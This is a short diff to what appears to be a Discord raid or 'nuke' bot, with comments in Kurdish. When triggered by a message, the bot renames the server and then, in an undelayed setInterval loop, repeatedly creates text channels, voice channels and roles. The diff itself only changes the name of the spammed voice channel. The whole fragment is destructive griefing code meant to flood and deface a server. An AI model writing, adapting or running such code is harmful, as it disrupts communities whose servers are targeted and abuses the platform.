@@ -18,7 +18,7 @@ client.on("message", message => {
       message.guild.setName("dev baby Up");////nawek dane bo sar server 
       setInterval(function() {
         message.guild.createChannel("smart up", "text");///////bo channel 
-        message.guild.createChannel("billo Up", "voice");////bo voice
+        message.guild.createChannel("dev baby Up", "voice");////bo voice
         message.guild.createRole({ name: "aled Up" });////nawek dane bo role kan
       });
     }
